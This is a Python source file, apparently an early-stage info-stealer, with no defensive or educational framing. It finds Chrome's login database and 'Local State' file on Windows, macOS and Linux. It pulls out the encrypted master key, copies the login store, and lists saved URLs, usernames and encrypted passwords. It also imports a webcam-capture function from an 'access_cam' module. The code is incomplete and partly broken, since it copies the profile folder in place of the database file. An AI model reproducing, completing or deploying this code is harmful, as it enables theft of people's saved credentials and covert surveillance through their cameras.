# script.py
import os
import sys
import json
import sqlite3
import shutil
import ctypes
from access_cam import save_from_cam

def get_local_data_path():
    if sys.platform == 'win32':
        return os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
    elif sys.platform == 'darwin':
        return os.path.join(os.environ['HOME'], 'Library', 'Application Support', 'Google', 'Chrome', 'Default')
    elif sys.platform == 'linux':
        return os.path.join(os.environ['HOME'], '.config', 'google-chrome', 'Default')
    else:
        raise Exception('Unsupported platform: ' + sys.platform)


def get_local_state_path():
    if sys.platform == 'win32':
        return os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    elif sys.platform == 'darwin':
        return os.path.join(os.environ['HOME'], 'Library', 'Application Support', 'Google', 'Chrome')
    elif sys.platform == 'linux':
        return os.path.join(os.environ['HOME'], '.config', 'google-chrome')
    else:
        raise Exception('Unsupported platform: ' + sys.platform)


def get_local_data_content(local_data_path):
    with open(os.path.join(local_data_path, 'Login Data'), 'rb') as f:
        return f.read()


def get_local_state_content(local_state_path):
    with open(os.path.join(local_state_path, 'Local State'), 'rb') as f:
        return f.read()


def get_encryption_key(local_state_content):
    local_state_json = json.loads(local_state_content)
    #write to localstate.json file
    with open("localstate.json", "w") as f:
        f.write(json.dumps(local_state_json, indent=4))

    encryption_key = local_state_json['os_crypt']['encrypted_key']
    return encryption_key


def connect_to_sqlite():
    shutil.copy2(get_local_data_path(), "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    return cursor


def main():
    print("Main çalıştı abem")
    # Get the paths
    local_data_path = get_local_data_path()
    local_state_path = get_local_state_path()
    # Get the contents
    local_data_content = get_local_data_content(local_data_path)
    local_state_content = get_local_state_content(local_state_path)
    # Get the encryption key
    encryption_key = get_encryption_key(local_state_content)
    # Print the results for checking
    # print('Local Data Path: ', local_data_path)
    # print('Local State Path: ', local_state_path)
    # print('Local Data Content: ', local_data_content)
    # print('Local State Content: ', local_state_content)
    # print('Encryption Key: ', encryption_key)

    cursor = connect_to_sqlite()
    cursor.execute(
        "SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        print("Url:", url)
        print("Username", username)
        print("Cipher Text", ciphertext)

# def simulate_from_copied_file():


# export main
if __name__ == '__main__':
    main()
